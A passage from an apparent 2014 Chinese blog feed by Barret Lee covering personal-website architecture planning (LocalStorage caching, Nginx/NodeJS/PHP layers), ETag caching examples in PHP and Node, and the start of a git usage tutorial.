小小网站，为啥我要如此看重后端</h3><p>其实最主要的原因是，我买的主机配置很低。呵呵，是的，昨天很多朋友在留言里都提到了购买云主机/VPS相关的东西。今天我也是花了不少时间在各个群里请教，并且也访问、对比了一些云主机供应商的网站。之前在 V2ex 上看到了不少相关的帖子，今天进去翻，没翻到之前点过赞的贴。过程就不多说了，开始打算买个国外的主机，不用备案~ 后来嫌麻烦，买了个阿里云服务器：</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="meta">CPU</span>： <span class="number">1</span>核</span><br><span class="line">内存： 512MB</span><br><span class="line">数据盘： 40G</span><br><span class="line">带宽： 1Mbps</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>买一年省俩月的钱，总共是七百多。选用的 Ubuntu 12.04, 64位系统。不过呢，我并没有一次性买一年的，先花几十块钱买了一个月，试用，反正以后续费还是原价（不像域名那样坑爹，续费就涨价）。域名我是一次性买的十年的，55/年，这东西不贵，多买几年，省事儿。然后进入阿里云的流程，正在备案中...</p><p>回到重点，为啥看重后端，看到上面的配置，相比大家也知道了，搞一个实时通信的网站，每个连接后端都需要内存来处理，而且这个内存在链接断开之前是不会释放的（socket连接），目测同时在线超过30个人，系统就要卡住了。内存是一个很大的瓶颈，然后就是带宽了，1M真的很低。其实买个配置高点的主机，一年也就一两千，这次故意买个最低配置是为了让自己培养珍惜流量意识，希望编程可以考虑到每个 byte 的消耗，等这种意识（或者技术）养成了，再提高主机的配置。</p><p>第二个原因就是熟悉后端，数据库方面的处理一直是自己的弱项，如果不试着提高下，以后工作中遇到坎就会很难受了。这段时间在阿里实习，经常会感觉有些知识不够用了，希望返校继续加强学习。</p><h3>2. 前端也是重点</h3><p>前端有一个很大胆的尝试，\数据在前端"。</p><p>打开一个网页，浏览器发送请求到服务器，服务器从数据库里获取数据，经过后台脚本的拼装处理，然后输出到前端，这是最常见的方式。这种方式的缺点就是，频繁的读取数据库，然后还有一大堆经过HTML标签包装过的数据传到前端，期间的冗余消耗是特别大的。于是有人就想到了，后端的数据全部使用JSON方式输出，到了前端再渲染数据，这种方式获得了一定的优化效果，前端端的分离似乎也很明显，但是前端负担就太重了，数据的处理和渲染都是前台，也就是承担了Controller和Views的角色，前台很累，他累了也会发脾气，比如：数据到了，要半天之后才解析完毕，再花半天将其渲染出来。同时这种处理方式也不利于SEO。</p><p>现在的尝试是，前端就是一个数据库，每个用户都有数据库数据的一个备份。</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">                    +----------+</span><br><span class="line">                    |<span class="string">          </span>|</span><br><span class="line">                    |<span class="string"> Database </span>|</span><br><span class="line">                    |<span class="string">          </span>|</span><br><span class="line">                    +-----|<span class="string">----+</span></span><br><span class="line"><span class="string">                          </span>|</span><br><span class="line">                +---------|<span class="string">----------+</span></span><br><span class="line"><span class="string">               /</span>|<span class="string">                    </span>|<span class="string">\</span></span><br><span class="line"><span class="string">              / </span>|<span class="string">       Server       </span>|<span class="string"> \</span></span><br><span class="line"><span class="string">             /  </span>|<span class="string">                    </span>|<span class="string">  \</span></span><br><span class="line"><span class="string">            /   +----</span>|<span class="string">----------</span>|<span class="string">----+   \</span></span><br><span class="line"><span class="string">           /         </span>|<span class="string">          </span>|<span class="string">         \</span></span><br><span class="line"><span class="string">+---------/+  +------</span>|<span class="string">---+  +---</span>|<span class="string">------+  +\---------+</span></span><br><span class="line"><span class="string"></span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|</span><br><span class="line">|<span class="string">  Client  </span>|<span class="string">..</span>|<span class="string">  Client  </span>|<span class="string">..</span>|<span class="string">  Client  </span>|<span class="string">..</span>|<span class="string">  Client  </span>|</span><br><span class="line">|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|</span><br><span class="line">+-----|<span class="string">----+  +-----</span>|<span class="string">----+  +-----</span>|<span class="string">----+  +-----</span>|<span class="string">----+</span></span><br><span class="line"><span class="string">      </span>|<span class="string">             </span>|<span class="string">             </span>|<span class="string">             </span>|</span><br><span class="line">+-----|<span class="string">----+  +-----</span>|<span class="string">----+  +-----</span>|<span class="string">----+  +-----</span>|<span class="string">----+</span></span><br><span class="line"><span class="string"></span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|</span><br><span class="line">|<span class="string">  Local   </span>|<span class="string">  </span>|<span class="string">  Local   </span>|<span class="string">  </span>|<span class="string">  Local   </span>|<span class="string">  </span>|<span class="string">  Local   </span>|</span><br><span class="line">|<span class="string"> Storage  </span>|<span class="string">  </span>|<span class="string"> Storage  </span>|<span class="string">  </span>|<span class="string"> Storage  </span>|<span class="string">  </span>|<span class="string"> Storage  </span>|</span><br><span class="line">|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">          </span>|</span><br><span class="line">+----------+  +----------+  +----------+  +----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>浏览器每次连接到服务器，都会将服务器的数据同步到本地，打开页面，第一件事是呈现当前LocalStorage的数据，然后发送一个请求询问服务器，\是否有数据更新啊？"，每次只拉去更新的数据。</p><p>有人会觉得这种方式不可取，本地存不了这么多东西啊。当然存不了这么多，一篇文章有作者、标题、日期、概要还有内容，我们可以在本地储存除内容之外的所有东西，就算有100篇文章，其缓存的量也不过几百KB，试想你加载个 JQ 是不是也得上百KB啊~那么每次我们从后端拉取的数据量就十分小了。</p><p>至于本地储存的实现方式，这个好处理，LocalStorage、IndexDB、UserData等等，方式很多，还有一些其他比较 hack 的方式，我以后再介绍。</p><h3>3. 前后端之间的屏障</h3><p>后端会有很多的服务，比如邮件、HTTP、HTTPS、socket等等，再比如：A域名、B域名、A子域名、B子域名的处理等等。为了处理伪静态，安全，缓存，动静页面分离等多个问题，决定在昨天考虑的架构上再加一层 Nginx。</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">    +------------------+     +------------------+</span><br><span class="line">    |<span class="string"> Front-End        </span>|<span class="string">     </span>|<span class="string"> Browser          </span>|</span><br><span class="line">    |<span class="string">     前端处理      </span>|<span class="string">     +--------------+   </span>|</span><br><span class="line">    |<span class="string">                  </span>|<span class="string">←---→</span>|<span class="string"> LocalStorage </span>|<span class="string">   </span>|</span><br><span class="line">    +--↑-----↑-----↑---+     +--------------+---+</span><br><span class="line">       |<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">       |<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">       |<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">    +------------------+</span><br><span class="line">    |<span class="string"> Nginx            </span>|</span><br><span class="line">+----     请求/代理    ---------------------------+</span><br><span class="line">|<span class="string">   </span>|<span class="string">                  </span>|<span class="string">                         </span>|</span><br><span class="line">|<span class="string">   +------------------+                         </span>|</span><br><span class="line">|<span class="string">      </span>|<span class="string">     </span>|<span class="string">     </span>|<span class="string">                             </span>|</span><br><span class="line">|<span class="string">      </span>|<span class="string">     </span>|<span class="string">     </span>|<span class="string">                             </span>|</span><br><span class="line">|<span class="string">   +--↓-----↓-----↓---+                         </span>|</span><br><span class="line">|<span class="string">   </span>|<span class="string"> NodeJS           </span>|<span class="string">     +-------------+     </span>|</span><br><span class="line">+--&gt;|<span class="string">     处理I/O       </span>|<span class="string">     </span>|<span class="string"> Database    </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">   </span>|<span class="string">                  </span>|<span class="string">←-+-→</span>|<span class="string">             </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">   +-----</span>|<span class="string">-----↑------+  </span>|<span class="string">  </span>|<span class="string">             </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">     </span>|<span class="string">         </span>|<span class="string">  </span>|<span class="string">             </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">   +-----↓-----</span>|<span class="string">------+  </span>|<span class="string">  +----------+  </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">   </span>|<span class="string"> PHP              </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">     </span>|</span><br><span class="line">+--&gt;|<span class="string">     处理数据      </span>|<span class="string">←-+-→</span>|<span class="string">   cache  </span>|<span class="string">  </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">   </span>|<span class="string">                  </span>|<span class="string">     </span>|<span class="string">          </span>|<span class="string">  </span>|<span class="string">     </span>|</span><br><span class="line">|<span class="string">   +------------------+     +----------+--+     </span>|</span><br><span class="line">|<span class="string">                                                </span>|</span><br><span class="line">+------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>东西越多，维护成本越高，不过我竟然觉得添加一层会有更多的乐趣...</p><p>后续会继续记录建站过程。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人网站架构设计(一)</title>
      <link href="/blog/2014/05/13/cb-personal-website-design-part-1/"/>
      <url>/blog/2014/05/13/cb-personal-website-design-part-1/</url>
      
        <content type="html"><![CDATA[<p>网站地址：<a href="http://barretlee.com">http://barretlee.com</a></p><p>从大二开始，坚持每月3到8篇的技术分享，到现在差不多两年了。一直在分享之中跟着大家一起进步，从最开始的<a href="http://qianduan-notes.diandian.com/" target="_blank">点点网</a>，到<a href="//github.com/barretlee/" target="_blank">github</a>，再到现在的博客园。分享是一件有趣的事情，能够收到很多的反馈，渐渐地，已经把写博当成一种习惯。</p><p>在不同的平台上写博客会有不同的感受，但是几乎没有哪个平台可以满足自己的所有需求，比如，期望没有广告、希望速度可以更快、自己可以更多的操作后端、找个地方放DEMO、有个NodeJS测试的环境、自定义样式和主题等等，对我这个喜欢折腾的人来说，这些需求真是太普通了，可惜，没有哪个平台可以提供这么多的服务。再如，我希望把更多的生活中元素或者情感的东西带到博客中来，这些平台貌似不太适合做这些事情。</p><p>无奈之下只好自己花点钱买个主机安置个人网站。搭建一个网站是一个系统学习前后端的最佳机会，之前考虑过使用别人的框架，快捷搞定一个博客平台，但是我希望这次的网站架设能够承受几十万甚至上百万的PV（哈哈，这个可能性几乎为零，主要为了提高标准），同时也支持一些诸如陌生人交流，网站爬虫归类等等附加的功能。用商业性网站的建站标准来规范化网站，也给自己一个实践的机会~</p><p>花了四五个小时整理了思路，考虑的东西有点多，所以通过文字将建站的整个过程记录下来。</p><h3>1、网站定位</h3><p>记录生活，分享交流。凸显交流。</p><h3>2、设计理念</h3><ul><li>重视体验</li><li>数据在前端</li><li>实时更新</li><li>快、稳定、安全</li><li>自动化</li><li>低消耗、低流量</li></ul><h3>3、基本架构</h3><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+------------------+     +------------------+</span><br><span class="line">|<span class="string"> Front-End        </span>|<span class="string">     </span>|<span class="string"> Browser          </span>|</span><br><span class="line">|<span class="string">                  </span>|<span class="string">     </span>|<span class="string">                  </span>|</span><br><span class="line">|<span class="string">     前端处理      </span>|<span class="string">     +--------------+   </span>|</span><br><span class="line">|<span class="string">                  </span>|<span class="string">←---→</span>|<span class="string"> LocalStorage </span>|<span class="string">   </span>|</span><br><span class="line">+--↑-----↑-----↑---+     +--------------+---+</span><br><span class="line">   |<span class="string">     </span>|<span class="string">     </span>|</span><br><span class="line">+--↓-----↓-----↓---+</span><br><span class="line">|<span class="string"> NodeJS           </span>|<span class="string">     +-------------+</span></span><br><span class="line"><span class="string"></span>|<span class="string">     处理I/O      </span>|<span class="string">     </span>|<span class="string"> Database    </span>|</span><br><span class="line">|<span class="string">                  </span>|<span class="string">←-+-→</span>|<span class="string">             </span>|</span><br><span class="line">+-----|<span class="string">-----↑------+  </span>|<span class="string">  </span>|<span class="string">             </span>|</span><br><span class="line">      |<span class="string">     </span>|<span class="string">         </span>|<span class="string">  </span>|<span class="string">             </span>|</span><br><span class="line">+-----↓-----|<span class="string">------+  </span>|<span class="string">  +----------+  </span>|</span><br><span class="line">|<span class="string"> PHP              </span>|<span class="string">  </span>|<span class="string">  </span>|<span class="string">          </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string">     处理数据      </span>|<span class="string">←-+-→</span>|<span class="string">   cache  </span>|<span class="string">  </span>|</span><br><span class="line">|<span class="string">                  </span>|<span class="string">     </span>|<span class="string">          </span>|<span class="string">  </span>|</span><br><span class="line">+------------------+     +----------+--+  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>三个重点：</p><ul><li>前端数据缓存。数据放在本地LocalStorage中，用户每次访问网站，都会从数据库拉去数据，同步到本地。低版本IE基本快死绝了，这个降级处理。</li><li>NodeJS 处理I/O，如果某个页面的单日访问量太大，不至于服务器扛不住。由于全站使用socket连接，利用NodeJS也便于后端编程。</li><li>数据库对针对访问频率进行cache。</li></ul><h3>4、基本模块</h3><ol><li>留言，多个位置使用，组件化处理</li><li>自动化分享，发布文章自动分享到 SNS 上</li><li>防盗链/盗链</li><li>数据自动备份</li><li>后台发文系统</li><li>提问交流平台</li><li>陌生人交流模块</li><li>最新资讯的爬虫</li><li>RSS聚合</li><li>QQ回复/邮件自动回复功能</li></ol><p>后续会针对每个功能模块，进行详细的记录。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Etag缓存在PHP和NodeJS中的实现</title>
      <link href="/blog/2014/05/11/cb-etag-in-node/"/>
      <url>/blog/2014/05/11/cb-etag-in-node/</url>
      
        <content type="html"><![CDATA[<p>HTTP 提供了许多页面缓存的方案，其中属 Etag 和 Last-Modified 应用最广。本文会先介绍 Etag 的应用场景，然后说说他在 php 和 node 中的使用。</p><h3>一、Etag的使用</h3><p>客户端和浏览器之间的交互：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+---------+       1         +---------+</span><br><span class="line">|<span class="string">         </span>|<span class="string">----------------&gt;</span>|<span class="string">         </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">   2（200，OK）   </span>|<span class="string">         </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">&lt;----------------</span>|<span class="string">         </span>|</span><br><span class="line">|<span class="string">    客   </span>|<span class="string">    3（Etag）     </span>|<span class="string">    服   </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">----------------&gt;</span>|<span class="string">         </span>|</span><br><span class="line">|<span class="string">    户   </span>|<span class="string">    4（304）      </span>|<span class="string">    务   </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">&lt;----------------</span>|<span class="string">         </span>|</span><br><span class="line">|<span class="string">    端   </span>|<span class="string">    3（强制刷新）  </span>|<span class="string">    端   </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">----------------&gt;</span>|<span class="string">         </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">   6（200，OK）   </span>|<span class="string">         </span>|</span><br><span class="line">|<span class="string">         </span>|<span class="string">&lt;----------------</span>|<span class="string">         </span>|</span><br><span class="line">+---------+                 +---------+</span><br><span class="line">                <span class="variable">&lt;Created By Barret Lee&gt;</span></span><br></pre></td></tr></table></figure><p>1. 客户端向服务器请求资源S</p><p>2. 服务器返回数据，并带上一个 Etag</p><p>3. 客户端再次请求资源S，由于上次服务器给他返回了一个 Etag，这次请求的时候他会带上这个 Etag</p><p>4. 服务器发现请求中包含 Etag，判断是否过期，没过期则返回 304 Not Modified</p><p>5. 客户端强制刷新（如chrome中ctrl+shift+R刷新页面），请求中剔除 Etag</p><p>6. 服务器未发现请求中包含 Etag，返回资源S，并带上一个 Etag</p><h3>二、代码实现</h3><p>第一次请求数据：</p><p><img src="https://images.cnitblog.com/i/387325/201405/111923172133405.jpg" alt=""></p><p>浏览器在接受到服务器发过来的 Etag 后，会保存下来，下次请求的时候会将它放在请求头中，其 key 值为 If-None-Match。</p><p><img src="https://images.cnitblog.com/i/387325/201405/111923246041196.jpg" alt=""></p><p>服务器拿到 If-None-Match 之后，对比之前的 Etag，如果没变，则返回 304 Not Modified.</p><h4>1. php 中的 Etag</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;Barret Lee&quot;</span>;</span><br><span class="line">    <span class="variable">$Etag</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;HTTP_IF_NONE_MATCH&#x27;</span>, <span class="variable">$_SERVER</span>) <span class="keyword">and</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_IF_NONE_MATCH&#x27;</span>] == <span class="variable">$Etag</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 304 Not Modified&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Etag:&quot;</span> . <span class="variable">$Etag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Etag 是一个字符串，我们一般使用该请求对应响应输出的 md5 值作为 Etag，可以简单地理解为文件的版本号。在 php 中存在两个获取 md5 的函数，一个是针对字符串的，就是 <code>md5()</code>，然后就是针对文件的， <code>md5_file()</code>。</p><p>首先判断在请求中是否包含 'HTTP_IF_NONE_MATCH' 这个 key，如果包含并且其值为之前的 md5 值，则返回 304，否则输出 Etag 以及内容。</p><h4>2. node 中的 Etag</h4><p>与 php 有些不同，从 $_SERVER 中拿到的内容是经过 apache 包装过的，而 node 获取的数据是最原始的。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hashStr = <span class="string">&quot;A hash string.&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">hash</span> = require(<span class="string">&quot;crypto&quot;</span>).createHash(<span class="string">&#x27;sha1&#x27;</span>).update(hashStr).digest(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">require(<span class="string">&quot;http&quot;</span>).createServer(<span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.headers[<span class="string">&#x27;if-none-match&#x27;</span>] == <span class="built_in">hash</span>)&#123;</span><br><span class="line">        res.writeHead(<span class="number">304</span>);</span><br><span class="line">        res.end();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.writeHead(<span class="number">200</span>, &#123;</span><br><span class="line">        <span class="string">&quot;Etag&quot;</span>: <span class="built_in">hash</span></span><br><span class="line">    &#125;)</span><br><span class="line">    res.write(hashStr);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;).listen(<span class="number">9999</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面对 hashStr（输出的内容） 进行了简单的处理，并将其作为 Etag 放在 head 中输出，上面的代码一目了然，我就不解释了。</p><h3>三、小结</h3><p>Etag 在缓存处理中用的比较广泛，使用它可以减少一些不必要请求的带宽的占用。服务器输出的内容不变，浏览器就应该使用缓存，没必要每次都向服务器端索要数据，造成不必要的浪费。</p><p>从上面我们可以看到，如果想拿到 Etag，就必须先拿到要输出的数据，所以 Etag 只能减少带宽的占用，并不能降低服务器的消耗。如果是静态页面，可以判断文件最近一次的修改时间（Last-Modified），获取文件上次修改时间的消耗比拿到整个数据的消耗要小的多。所以很多时候 Etag 都是配合这 Last-Modified 一起使用的。</p><p>上面的 php 和 node 代码演示，很明显的差异就是，node 更加细致，或者说他更加底层，我们可以获取的几乎都是未加修饰的原始数据，从数据量的交互和可操控性来看，我更偏向于 node 的使用。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> PHP </tag>
            
            <tag> NodeJS </tag>
            
            <tag> Etag </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git版本管理策略及相关技巧(A)</title>
      <link href="/blog/2014/05/07/cb-git-improve/"/>
      <url>/blog/2014/05/07/cb-git-improve/</url>
      
        <content type="html"><![CDATA[<p><span>公司几乎所有的项目都是使用 git 仓库来管理代码，以前对 git 只有些肤浅的了解，每次提交代码或者上线的时候总是会提心吊胆，生怕出现一些未知的问题。经过三个月的踩坑和填坑， git 操作颇显成熟。仅以此文回忆学习 git 的历史。</span></p><h3>一、基本操作</h3><h4>1. 克隆代码</h4><p><strong>1.1 添加仓库</strong></p><p>最直接的方式：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd dir  <span class="comment"># 这里不用新建一个项目名的文件夹，dir为git文件夹的父文件夹</span></span><br><span class="line">git clone <span class="regexp">//gi</span>thub.com<span class="regexp">/barretlee/</span>Micro-Share</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你也可以进入一个目录，然后初始化（init）：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd path<span class="regexp">/to/</span>Project</span><br><span class="line">git init</span><br><span class="line"><span class="comment"># 添加远程目录</span></span><br><span class="line">git remote add origin <span class="regexp">//gi</span>thub.com<span class="regexp">/barretlee/</span>Micro-Share</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这些都是最基本的了，上面的 remote add 是添加一个远程目录，你也可以添加多个远程目录，什么情况下会添加多个呢？比如：我想把别人的代码处理之后放到自己的 git 仓库上去,</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git remote add origin <span class="regexp">//gi</span>thub.com<span class="regexp">/barretlee/</span>Micro-Share</span><br><span class="line">git remote add mine http:<span class="regexp">//y</span>our<span class="regexp">/path/</span>to/git</span><br><span class="line"><span class="comment"># 拉取远程代码到 init 之后的 master 主干上</span></span><br><span class="line">git fetch origin master</span><br><span class="line"><span class="comment"># 修改代码之后，提交到自己的仓库</span></span><br><span class="line">git commit -am <span class="string">&quot;fist&quot;</span></span><br><span class="line">git push -u mine master</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>1.2 添加文件</strong></p><p>在提交文件之前首先要添加文件到分支中，很多人只知道：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">add</span> .</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果有文件删除，会发现这些删除的文件并没有被附加进去，肿么办？</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#方式一</span></span><br><span class="line">git <span class="built_in">add</span> --all .</span><br><span class="line"><span class="comment">#方式二</span></span><br><span class="line">git <span class="built_in">add</span> -A .</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>--all</code> 参数，顾名思义，添加所有文件（change|delete|add）</li><li><code>-A</code> 参数，添加修改过和删除过的文件（change|delete）</li><li>不加 参数，添加修改过和添加的文件（change|add）</li></ul><p><strong>1.3 提交文件</strong></p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> commit -m <span class="string">&quot;comment&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果没有删除过文件，可以合并添加和提交文件为一步：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> commit -am <span class="string">&quot;add and commit&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>1.4 远程提交</strong></p><p>提交到远程仓库上：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 master 提交到 origin 上</span></span><br><span class="line">git push origin <span class="keyword">master</span></span><br><span class="line"><span class="title"></span></span><br></pre></td></tr></table></figure><p>这一步操作可能会出现很多的问题，比如：</p><p>a) origin为一个多人开发的库，别人在你提交之前已经向 origin 上提交过一次（或者多次），那么此时你的版本是落后于远程服务器版本的，你需要先拉去线上最新的代码：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拉去远程分支到 master</span></span><br><span class="line">git pull origin <span class="keyword">master</span></span><br><span class="line"><span class="title"></span></span><br></pre></td></tr></table></figure><p>b) 执行 a) 之后，有可能也会有提醒：存在冲突，需要合并分支，这个在后面会提到</p><p>c) 如果你很自信，觉得线上的版本是存在问题，你这个版本木有问题，你可以强制提交你的代码</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">git push -u origin <span class="keyword">master</span> <span class="title">-f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要特别注意，加了 -f 线上之前的修改就会被删掉，请谨慎使用！</p><h3>二、进阶操作指南</h3><p>上面是最基本的几条命令，初用 git 的童鞋一般也只会接触这些东西，在一些复杂的多人开发项目中，修改代码、合并代码十分频繁，上面的命令显然是不够用了。在介绍进阶命令之前，先了解下 git 的三种状态。</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+-----------+      +-----------+       +-----------+</span><br><span class="line">|<span class="string">           </span>|<span class="string">      </span>|<span class="string">           </span>|<span class="string">       </span>|<span class="string">           </span>|</span><br><span class="line">|<span class="string">  working  </span>|<span class="string"> --&gt;  </span>|<span class="string">   index   </span>|<span class="string">  --&gt;  </span>|<span class="string">  commit   </span>|</span><br><span class="line">|<span class="string">           </span>|<span class="string">      </span>|<span class="string">           </span>|<span class="string">       </span>|<span class="string">           </span>|</span><br><span class="line">+-----------+      +-----------+       +-----------+</span><br><span class="line">      ↓                  ↓                   ↓</span><br><span class="line">   当前操作            git add            git commit</span><br><span class="line"></span><br><span class="line">                              <span class="variable">&lt;Created By Barret Lee&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></created><p>你当前的操作状态下，所有文件的状态都在 work 状态，当你执行 git add 之后，文件状态变为 index，也就是在 git 中已经有过一次登记了，而 git commit 之后就被编入了分支，成为 commited 状态了。需要注意的是，这三种状态一直存在，只是会有不同的文件来对应这些状态。</p><h4>1. 场景切换</h4><blockquote><p>Barret 有一天敲代码，代码敲了一半，Boss 跟他说，线上出了个 bug，赶紧的，去修复！</p></blockquote><p>咋办？上面那堆代码，敲了半个上午啊，重新新建一个文件夹，然后把线上代码再克隆一次修改？这种处理的成本显然太高了！其实 git 为我们提供了很好用的命令 git stash。只要在当前目录下操作：</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git stash</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这句命令执行完毕之后，git 管理区中的 stash 会多出一条记录，这条记录保存了上一次提交到目前，你所有的修改:</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">last</span></span> commit ... working <span class="keyword">file</span> now</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着你就可以修改你的 bug 了，修改完了之后，再使用</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">git stash <span class="built_in">pop</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将之前保存的修改（场景）还原回来。其内部的原理也是很简单的：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+---------------+      +-----------+      +-----------+       +-----------+</span><br><span class="line">|<span class="string">               </span>|<span class="string">      </span>|<span class="string">           </span>|<span class="string">      </span>|<span class="string">           </span>|<span class="string">       </span>|<span class="string">           </span>|</span><br><span class="line">|<span class="string">  last commit  </span>|<span class="string"> --&gt;  </span>|<span class="string">  working  </span>|<span class="string"> --&gt;  </span>|<span class="string">   index   </span>|<span class="string">  --&gt;  </span>|<span class="string">  commit   </span>|</span><br><span class="line">|<span class="string">               </span>|<span class="string">      </span>|<span class="string">           </span>|<span class="string">      </span>|<span class="string">           </span>|<span class="string">       </span>|<span class="string">           </span>|</span><br><span class="line">+---------------+  ↑   +-----------+      +-----------+   |<span class="string">   +-----------+</span></span><br><span class="line"><span class="string">      ↓            </span>|<span class="string">         ↓                  ↓         </span>|<span class="string">          ↓</span></span><br><span class="line"><span class="string">   上次提交         </span>|<span class="string">      当前操作            git add      </span>|<span class="string">    git commit</span></span><br><span class="line"><span class="string">                   </span>|<span class="string">                                     s</span>|</span><br><span class="line">                   |<span class="string">                                     t</span>|</span><br><span class="line">                   |<span class="string">       +---------+                   a</span>|</span><br><span class="line">                   |<span class="string">       </span>|<span class="string"> Stash 0 </span>|<span class="string">                   s</span>|</span><br><span class="line">                   |<span class="string">       +---------+                   h</span>|</span><br><span class="line">                   +------ |<span class="string"> Stash 1 </span>|<span class="string"> &lt;------------------+</span></span><br><span class="line"><span class="string">                           +---------+</span></span><br><span class="line"><span class="string">                           </span>|<span class="string">  ....   </span>|</span><br><span class="line">                           +---------+</span><br><span class="line">                           |<span class="string"> Stash n </span>|</span><br><span class="line">                           +---------+</span><br><span class="line">                                ↓                    <span class="variable">&lt;Created By Barret Lee&gt;</span></span><br><span class="line">                             stash堆栈</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有些童鞋可能看不太懂上面的图，git 有一个场景（stash）堆栈，这个堆栈的作用是用于保存修改的，下面举个例子：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入文件夹</span></span><br><span 